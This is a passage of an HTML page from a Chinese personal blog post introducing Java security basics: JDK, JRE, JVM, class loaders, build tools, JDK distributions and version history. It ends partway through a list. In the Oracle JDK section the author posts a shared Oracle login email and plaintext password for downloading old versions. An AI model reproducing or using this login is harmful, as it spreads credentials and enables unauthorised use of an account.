<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/11/java 安全基础/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java 安全基础 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">30</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java 安全基础</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-11 23:50:14</span>
        <span class="mobile">2024-11-11 23:50:14</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-04-05 03:38:29</span>
            <span class="mobile">2025-04-05 03:38:29</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>35.2k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>145 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.javasec.org/" >https://www.javasec.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java" >https://p4d0rn.gitbook.io/java<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>Java 是一种 <strong>面向对象的编程语言</strong>，由 <strong>Sun Microsystems</strong>（现在是 Oracle）于 1995 年发布。它是 <strong>跨平台</strong> 的，可以运行在不同操作系统上，而不需要修改源代码。Java 程序可以通过 <strong>JVM（Java Virtual Machine）</strong> 在不同平台上运行。</p>
<ul>
<li><strong>跨平台</strong> ：Java 程序经过编译后，会生成与平台无关的字节码（.class 文件），通过 JVM 解释或编译执行。</li>
<li><strong>面向对象</strong> ：Java 是一门面向对象的语言，强调封装、继承、多态、抽象等特性。Java 程序是通过 <strong>类（Class）</strong> 和 <strong>对象（Object）</strong> 组织的。</li>
</ul>
<h1 id="JDK（Java-Development-Kit）"><a href="#JDK（Java-Development-Kit）" class="headerlink" title="JDK（Java Development Kit）"></a>JDK（Java Development Kit）</h1><p><strong>JDK（Java Development Kit）</strong> 是 Java 开发工具包（Java Development Kit），是开发 Java 程序所需的工具集合。JDK 包含了 JRE 和一些用于开发 Java 应用的工具。</p>
<h2 id="JDK-的组成"><a href="#JDK-的组成" class="headerlink" title="JDK 的组成"></a>JDK 的组成</h2><h3 id="JRE（Java-Runtime-Environment）"><a href="#JRE（Java-Runtime-Environment）" class="headerlink" title="JRE（Java Runtime Environment）"></a>JRE（Java Runtime Environment）</h3><p><strong>JRE（Java Runtime Environment）</strong> 是 <strong>Java 运行时环境</strong>，是为 Java 程序的执行提供支持的软件环境。JRE 主要包含了 Java 虚拟机（JVM）和 Java 核心类库，确保 Java 应用程序可以在不同操作系统上无缝运行。</p>
<p>JRE 是 <strong>运行 Java 程序</strong> 的必需组件，它为开发者提供了一个可以运行 Java 字节码的环境。但它本身不包含开发工具，比如 Java 编译器（<code>javac</code>），因此 JRE 仅适用于运行 Java 程序，而不适用于开发 Java 程序。</p>
<h4 id="Java-虚拟机（JVM）"><a href="#Java-虚拟机（JVM）" class="headerlink" title="Java 虚拟机（JVM）"></a>Java 虚拟机（JVM）</h4><p><strong>JVM（Java Virtual Machine）</strong> 是 JRE 的核心部分，它负责加载和执行 Java 程序中的字节码。JVM 是 Java 实现 <strong>跨平台</strong> 的关键，能够在不同的操作系统上执行相同的 Java 程序。JVM 会将 Java 字节码转换成特定平台的机器代码并执行。</p>
<p>JVM 的主要任务包括：</p>
<ul>
<li><strong>加载字节码</strong>：JVM 加载 Java 字节码文件（<code>.class</code> 文件）到内存中。</li>
<li><strong>字节码验证</strong>：JVM 验证字节码，确保它符合 JVM 的执行规范。</li>
<li><strong>执行字节码</strong>：通过解释执行或即时编译（JIT）将字节码转换为机器码并执行。</li>
<li><strong>内存管理</strong>：JVM 负责分配和回收内存，特别是堆内存和栈内存。</li>
<li><strong>垃圾回收</strong>：JVM 通过垃圾回收机制自动回收不再使用的对象，以便释放内存。</li>
</ul>
<h4 id="Java-核心类库（Java-Core-Libraries）"><a href="#Java-核心类库（Java-Core-Libraries）" class="headerlink" title="Java 核心类库（Java Core Libraries）"></a>Java 核心类库（Java Core Libraries）</h4><p>Java 核心类库是 JRE 的另一个重要组成部分，它包含了 Java 程序运行所需的标准类和 API。核心类库包括以下几个常用的包：</p>
<ul>
<li><strong><code>java.lang</code></strong> ：包括基础类和常用类，如 <code>String</code>、<code>Object</code>、<code>Math</code>、<code>System</code> 等。</li>
<li><strong><code>java.util</code></strong> ：包含集合框架、日期、时间、随机数生成等常用工具类，如 <code>ArrayList</code>、<code>HashMap</code>、<code>Date</code>、<code>Calendar</code> 等。</li>
<li><strong><code>java.io</code></strong> ：提供输入输出流类，用于文件操作和数据流处理。</li>
<li><strong><code>java.net</code></strong> ：提供网络编程功能，支持 socket 编程、URL 处理等。</li>
<li><strong><code>java.sql</code></strong> ：用于数据库访问的标准 API，支持 JDBC。</li>
</ul>
<p>这些类库提供了 Java 应用程序开发和运行所需的基础功能。</p>
<h4 id="本地接口（Native-Interface）"><a href="#本地接口（Native-Interface）" class="headerlink" title="本地接口（Native Interface）"></a>本地接口（Native Interface）</h4><p>Java 程序与操作系统和硬件交互时，可能需要调用底层操作系统的功能。JRE 通过 <strong>Java 本地接口（JNI，Java Native Interface）</strong> 提供与本地代码（如 C 或 C++）的互操作能力。JNI 使得 Java 可以调用平台特定的库，执行操作系统的低级功能。</p>
<h4 id="Java-类加载器（ClassLoader）"><a href="#Java-类加载器（ClassLoader）" class="headerlink" title="Java 类加载器（ClassLoader）"></a>Java 类加载器（ClassLoader）</h4><p>JRE 中的 <strong>类加载器（ClassLoader）</strong> 负责将 Java 类（.class 文件）加载到 JVM 中。类加载器的任务包括：</p>
<ul>
<li><strong>加载类文件</strong> ：JVM 通过类加载器将字节码从硬盘、网络或其他地方加载到内存。</li>
<li><strong>检查类的可用性</strong> ：类加载器负责确定类是否已经被加载，避免重复加载。</li>
</ul>
<p>JRE 提供了几种不同类型的类加载器，分别负责加载不同类型的类，例如启动类加载器（Bootstrap ClassLoader）、扩展类加载器（Extension ClassLoader）和系统类加载器（System ClassLoader）。</p>
<h3 id="Java-开发工具（Java-Development-Tools）"><a href="#Java-开发工具（Java-Development-Tools）" class="headerlink" title="Java 开发工具（Java Development Tools）"></a>Java 开发工具（Java Development Tools）</h3><p>Java 开发工具是为 Java 开发者提供的，用于支持 <strong>代码编写、编译、调试、测试、打包和文档生成等任务</strong>。这些工具大多是命令行工具，也可以在集成开发环境（IDE）中找到它们的图形化界面。常见的 Java 开发工具包括 <strong>编译器（javac）</strong>、<strong>调试器（jdb）</strong>、<strong>打包工具（jar）</strong>、<strong>文档生成工具（javadoc）</strong> 等。</p>
<h4 id="Java-编译器（javac）"><a href="#Java-编译器（javac）" class="headerlink" title="Java 编译器（javac）"></a>Java 编译器（javac）</h4><p><code>javac</code> 是 Java 的编译器，负责将 <strong>Java 源代码（<code>.java</code> 文件）</strong> 编译成 <strong>字节码（<code>.class</code> 文件）</strong>。这些字节码是平台无关的，可以在任何安装了 JVM 的平台上运行。</p>
<p>例如我们运行下面这条命令，这会将 <code>HelloWorld.java</code> 编译成 <code>HelloWorld.class</code> 字节码文件。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac HelloWorld.java</span><br></pre></td></tr></table></figure></div>

<p>在 IDEA 中编译器选项在这里修改：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/image-20250218011825051.png"
                      alt="image-20250218011825051"
                ></p>
<h4 id="java-归档工具（jar）"><a href="#java-归档工具（jar）" class="headerlink" title="java 归档工具（jar）"></a>java 归档工具（jar）</h4><p><code>jar</code> 是 Java 的归档工具，用于将多个 <code>.class</code> 文件和其他资源（如配置文件、图片等）打包成一个单一的 <strong>JAR 文件</strong>，便于分发和部署。JAR 文件可以包含多个类文件和资源文件，并且支持压缩。</p>
<p>例如我们可以通过下面这条命令创建一个简单的 JAR 文件，包含多个 <code>.class</code> 文件：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cf myapp.jar *.class</span><br></pre></td></tr></table></figure></div>

<p>这里，<code>c</code> 表示创建，<code>f</code> 表示指定文件名，<code>myapp.jar</code> 是输出的 JAR 文件，<code>*.class</code> 表示要打包的所有类文件。</p>
<h4 id="Java-运行工具（java）"><a href="#Java-运行工具（java）" class="headerlink" title="Java 运行工具（java）"></a>Java 运行工具（java）</h4><p><code>java</code> 是用于运行 Java 程序的工具，它会调用 JRE 中的 <strong>Java 虚拟机（JVM）</strong>来加载执行 <code>.class</code> 文件。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java HelloWorld <span class="comment"># 并加载 Hello.class 文件来执行程序</span></span><br><span class="line">java -jar myapp.jar <span class="comment"># 运行 JAR 文件</span></span><br></pre></td></tr></table></figure></div>

<h2 id="JDK-的版本"><a href="#JDK-的版本" class="headerlink" title="JDK 的版本"></a>JDK 的版本</h2><p>Java 语言最初由 <strong>Sun Microsystems</strong>（后被 Oracle 收购）开发和维护，后来由 Oracle 以及一些开源社区继续维护和更新。由于不同的实现方式、开发目标以及不同的维护模式，产生了多种 <strong>JDK 实现</strong>。</p>
<h3 id="常见-JDK-发行版"><a href="#常见-JDK-发行版" class="headerlink" title="常见 JDK 发行版"></a>常见 JDK 发行版</h3><h4 id="Oracle-JDK"><a href="#Oracle-JDK" class="headerlink" title="Oracle JDK"></a>Oracle JDK</h4><p><strong>Oracle JDK</strong> 是由 Oracle 提供的官方 Java 实现。它包括了所有的功能和企业级支持，包括商业支持和额外的优化。Oracle JDK 是最广泛使用的 JDK 发行版之一，特别是在企业级应用中。</p>
<p>我们可以在 <a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/downloads/archive/#JavaSE" >Oracle JDK官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载安装历史版本的 Oracle JDK。</p>
<p>Oracle JDK 是 <strong>闭源</strong> 的，虽然它包含 Java 的完整功能，但对于某些用户（如企业用户）来说，可能需要购买支持和许可证。不过我们通常下载的 JAVA SE 版本，因此只需要登录即可。</p>
<blockquote>
<p><strong>Java SE（Java Standard Edition）</strong> 是 Java 语言的基础平台，提供了开发和运行桌面应用程序、控制台应用程序、命令行工具和普通应用程序所需要的所有基本类库和 API。</p>
<p><strong>Java EE（Java Enterprise Edition）</strong> 是 Java 平台的企业级版本，专门用于开发大型、复杂、分布式的企业级应用程序。它建立在 Java SE 的基础上，并扩展了许多高级功能和 API，适合于开发 Web 应用、分布式系统、大型企业系统等。</p>
<p><strong>Java EE</strong> 本身并不是一个独立的开发工具包，而是规范和技术的集合，它需要依赖 <strong>JDK</strong> 来进行开发和运行。<strong>JDK</strong> 提供了编译和运行 Java 应用所需要的工具，而 <strong>Java EE</strong> 则是一个扩展，提供了面向企业的技术和功能。</p>
<p>虽然 <strong>Java EE</strong>（或 <strong>Jakarta EE</strong>）提供了很多高级功能，如 <strong>EJB</strong>（企业级 Java Beans）、<strong>JPA</strong>（Java 持久化 API）、<strong>JMS</strong>（Java 消息服务）、<strong>JTA</strong>（Java 事务 API）等，但这些技术对于大多数 Web 应用来说并不总是必需的。随着 <strong>Spring</strong> 和 <strong>Spring Boot</strong> 的流行，很多开发者已经不再依赖传统的 <strong>Java EE</strong> 容器来开发 Web 应用，而是转向了更加轻量级、灵活的解决方案。也就是说现在的 Web 开发可以脱离传统的 <strong>Java EE</strong>，而使用 <strong>Java SE + Web 框架 + Web 服务器</strong> 的模式。</p>
<p><strong>因此我们在研究 Java 安全的时候一般不需要 Java EE 。</strong></p>
</blockquote>
<p>关于 Oracle 官网的登录，网上有很多 Oracle 的共享账号，这里提供一个方便下载：</p>
<ul>
<li>账号：<code>602205528@qq.com</code> </li>
<li>密码：<code>Hkk.520.1314</code></li>
</ul>
<h4 id="OpenJDK"><a href="#OpenJDK" class="headerlink" title="OpenJDK"></a>OpenJDK</h4><p><strong>OpenJDK</strong> 是 Java 的开源实现，是由多个开源社区（包括 Oracle）共同开发和维护的 JDK 版本。</p>
<p>OpenJDK 是 <strong>Java SE</strong> 的标准实现，并且是完全开源的，遵循 GNU General Public License（GPL）许可证。它没有 Oracle JDK 中的一些商业功能（如 Java Flight Recorder 等），但对于大多数开发者来说，OpenJDK 足以满足需求。</p>
<p>OpenJDK 是 Java SE 的参考实现，因此任何符合 Java SE 规范的 JDK 实现都可以被称为 “JDK”。多个公司和组织都基于 OpenJDK 提供了不同版本的 JDK，并提供相应的支持。例如：</p>
<ul>
<li><strong>AdoptOpenJDK（现在更名为 Adoptium）</strong> ：由社区维护的 OpenJDK 构建版本，适用于多种操作系统。</li>
<li><strong>Amazon Corretto</strong>  ：亚马逊提供的 OpenJDK 构建，具有长期支持（LTS）版本。</li>
<li><strong>Red Hat OpenJDK</strong>  ：由 Red Hat 提供的 OpenJDK 版本，适合企业级应用。</li>
</ul>
<p>我们下载的 Oracle JDK 只提供了 <code>java</code> 和 <code>javax</code> 包下的源码，没有 <code>sun</code> 包源码，这时候就需要去 OpenJDK 官网下载 JDK 源码：</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/tags" >https://hg.openjdk.org/jdk8u/jdk8u/tags<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk/jdk/tags" >https://hg.openjdk.org/jdk/jdk/tags<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>我们需要选择具体分支，然后点击 <code>zip</code> 下载源码压缩包。将 <code>sun</code> 目录复制到JDK的安装目录下的 <code>src</code>，IDEA 中 <code>Project Structure-&gt;SDKs-&gt;SourcePath</code>，添加 <code>src</code> 目录。</p>
<h3 id="JDK-的版本号演变"><a href="#JDK-的版本号演变" class="headerlink" title="JDK 的版本号演变"></a>JDK 的版本号演变</h3><h4 id="JDK-1-x-阶段（Java-的早期版本）"><a href="#JDK-1-x-阶段（Java-的早期版本）" class="headerlink" title="JDK 1.x 阶段（Java 的早期版本）"></a>JDK 1.x 阶段（Java 的早期版本）</h4><p>在这一阶段，Java 的版本号采用的是 <code>1.x</code> 的命名方式。从 <strong>JDK 1.0</strong> 到 <strong>JDK 1.4</strong>，每次更新都依赖于 <strong>1.x</strong> 的版本号来标识，包含了 Java 语言的最初发展和许多核心特性。</p>
<ul>
<li><strong>JDK 1.0 (1996)</strong> ：Java 的第一个版本，提供了最基本的类库和工具，标志着 Java 语言的正式发布。</li>
<li><strong>JDK 1.1 (1997)</strong> ：增强了 Java 的图形用户界面（GUI）能力，增加了 Java Beans、反射 API、JDBC 等重要功能。</li>
<li><strong>JDK 1.2 (1998)</strong> ：引入了 <strong>Java 2</strong> 的概念，增强了企业级开发（J2EE）和桌面应用开发（J2SE）支持，支持了集合框架、Swing 等技术。J2EE、J2SE 和 J2ME 架构首次提出。</li>
<li><strong>JDK 1.3 (2000)</strong> ：增加了更多的性能优化，改进了 RMI（远程方法调用）和 CORBA 支持。</li>
<li><strong>JDK 1.4 (2002)</strong> ：引入了正则表达式（regex）、日志 API、NIO（New I&#x2F;O）等新特性，进一步增强了 Java 在企业级应用中的功能。</li>
</ul>
<h4 id="Java-x-阶段（Java-语言的重大变革）"><a href="#Java-x-阶段（Java-语言的重大变革）" class="headerlink" title="Java x 阶段（Java 语言的重大变革）"></a>Java x 阶段（Java 语言的重大变革）</h4><p>此阶段的标志是 Java 从 <code>1.x</code> 版本号跳跃至 <strong>Java 5</strong>（JDK 1.5），进入了语言层面的重大更新。在 <strong>Java 5（JDK 1.5）</strong> 之后，Java 版本号逐步向更简洁的 <strong>Java x</strong> 命名方式发展，这也标志着 Java 语言和平台开始与更现代的开发理念接轨。</p>
<ul>
<li><strong>Java 5（JDK 1.5, 2004）</strong> ：这是 Java 语言的重大更新，引入了泛型、枚举类型、注解、增强的 <code>for</code> 循环等特性。为了突出其重要性，版本号直接跳跃至 <strong>Java 5</strong>，不再沿用 <code>1.x</code> 的版本号。这一版本的发布使得 Java 在语言层面发生了革命性的变化，正式支持了泛型和注解。</li>
<li><strong>Java 6（JDK 1.6, 2006）</strong> ：改进了性能和 JDK 本身的功能，增强了对编译器和脚本语言的支持，引入了 <strong>Java Compiler API</strong> 和 <strong>Java Shell</strong>。</li>
<li><strong>Java 7（JDK 1.7, 2011）</strong> ：引入了 <code>try-with-resources</code> 语法、改进的 I&#x2F;O（NIO 2）、Switch 支持字符串等新特性，增强了语言和库功能。</li>
<li><strong>Java 8（JDK 1.8, 2014）</strong> ：这一版本非常重要，该版本带来了 <strong>Lambda 表达式</strong>、<strong>Stream API</strong>、<strong>java.time 日期时间 API</strong> 等新特性，开始支持 <strong>函数式编程</strong>，极大地提高了开发效率。</li>
</ul>
<h4 id="JDK-x-阶段（现代的-JDK-版本）"><a href="#JDK-x-阶段（现代的-JDK-版本）" class="headerlink" title="JDK x 阶段（现代的 JDK 版本）"></a>JDK x 阶段（现代的 JDK 版本）</h4><p>从 <strong>JDK 9</strong> 开始，Java 进入了一个新的发展阶段，采用了更加简洁的版本号，并且开始实行 <strong>每六个月发布一个新版本</strong> 的计划。JDK 9 引入了 <strong>模块化系统（Project Jigsaw）</strong>，并且进一步加强了语言功能、JVM 性能和标准库。</p>
<ul>
